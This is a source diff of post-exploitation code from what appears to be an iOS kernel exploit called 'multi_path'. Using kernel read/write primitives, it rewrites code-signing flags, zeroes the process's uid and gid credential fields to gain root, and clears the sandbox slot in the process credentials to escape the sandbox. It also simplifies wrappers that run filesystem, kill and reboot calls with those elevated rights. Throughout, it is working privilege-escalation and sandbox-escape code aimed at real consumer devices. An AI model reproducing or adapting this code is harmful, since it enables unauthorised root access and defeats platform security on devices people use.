@@ -93,104 +93,84 @@ kern_return_t multi_path_start () {
     uint32_t csflags = kread_uint32(our_proc + 0x2a8 /* KSTRUCT_OFFSET_CSFLAGS */);
     csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_KILL | CS_HARD);
     kwrite_uint32(our_proc + 0x2a8 /* KSTRUCT_OFFSET_CSFLAGS */, csflags);
+    
+    multi_path_post_exploit();
 
     return ret;
+}
+
+BOOL multi_path_get_root(pid_t pid) {
+    uint64_t proc = multi_path_get_proc_with_pid(pid, false);
+    uint64_t ucred = kread_uint64(proc + offsetof_p_ucred);
+    kwrite_uint32(proc + offsetof_p_uid, 0);
+    kwrite_uint32(proc + offsetof_p_ruid, 0);
+    kwrite_uint32(proc + offsetof_p_gid, 0);
+    kwrite_uint32(proc + offsetof_p_rgid, 0);
+    kwrite_uint32(ucred + offsetof_ucred_cr_uid, 0);
+    kwrite_uint32(ucred + offsetof_ucred_cr_ruid, 0);
+    kwrite_uint32(ucred + offsetof_ucred_cr_svuid, 0);
+    kwrite_uint32(ucred + offsetof_ucred_cr_ngroups, 1);
+    kwrite_uint32(ucred + offsetof_ucred_cr_groups, 0);
+    kwrite_uint32(ucred + offsetof_ucred_cr_rgid, 0);
+    kwrite_uint32(ucred + offsetof_ucred_cr_svgid, 0);
+    
+    return (geteuid() == 0) ? YES : NO;
+}
+
+BOOL multi_path_unsandbox(pid_t pid) {
+    uint64_t proc = multi_path_get_proc_with_pid(pid, false);
+    uint64_t ucred = kread_uint64(proc + offsetof_p_ucred);
+    kwrite_uint64(kread_uint64(ucred + 0x78) + 8 + 8, 0x0);
+    
+    return (kread_uint64(kread_uint64(ucred + 0x78) + 8 + 8) == 0) ? YES : NO;
 }
 
 // called after multi_path_start
 kern_return_t multi_path_post_exploit () {
     
-    kern_return_t ret = KERN_SUCCESS;
+    BOOL root = multi_path_get_root(getpid());
+    BOOL sandb = multi_path_unsandbox(getpid());
     
-    if(our_proc == 0)
-        our_proc = multi_path_get_proc_with_pid(getpid(), false);
-    
-    if(our_proc == -1) {
-        printf("[ERROR]: no our proc. wut\n");
-        ret = KERN_FAILURE;
-        return ret;
-    }
-    
-    extern uint64_t kernel_task;
-    uint64_t kern_ucred = kread_uint64(kernel_task + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
-    
-    if(our_cred == 0)
-        our_cred = kread_uint64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
-    
-    kwrite_uint64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */, kern_ucred);
-    
-    setuid(0);
-    
-    
-    return ret;
-}
-
-/*
- *  Purpose: used as a workaround in iOS 11 (temp till I fix the sandbox panic issue)
- */
-void multi_path_set_cred_back () {
-    kwrite_uint64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */, our_cred);
+    if (root == true && sandb == true) return KERN_SUCCESS;
+    return KERN_FAILURE;
 }
 
 void multi_path_mkdir (char *path) {
-
-    multi_path_post_exploit();
     mkdir(path, S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
-    multi_path_set_cred_back();
 }
 
 void multi_path_rename (const char *old, const char *new) {
-
-    multi_path_post_exploit();
     rename(old, new);
-    multi_path_set_cred_back();
 }
 
 
 void multi_path_unlink (char *path) {
-
-    multi_path_post_exploit();
     unlink(path);
-    multi_path_set_cred_back();
 }
 
 int multi_path_chown (const char *path, uid_t owner, gid_t group) {
-    
-    multi_path_post_exploit();
     int ret = chown(path, owner, group);
-    multi_path_set_cred_back();
     return ret;
 }
 
 
 int multi_path_chmod (const char *path, mode_t mode) {
-    
-    multi_path_post_exploit();
     int ret = chmod(path, mode);
-    multi_path_set_cred_back();
     return ret;
 }
 
 
 int multi_path_open (const char *path, int oflag, mode_t mode) {
-    
-    multi_path_post_exploit();
     int fd = open(path, oflag, mode);
-    multi_path_set_cred_back();
-    
     return fd;
 }
 
 void multi_path_kill (pid_t pid, int sig) {
-    
-    multi_path_post_exploit();
     kill(pid, sig);
-    multi_path_set_cred_back();
 }
 
 
 void multi_path_reboot () {
-    multi_path_post_exploit();
     reboot(0);
 }
 
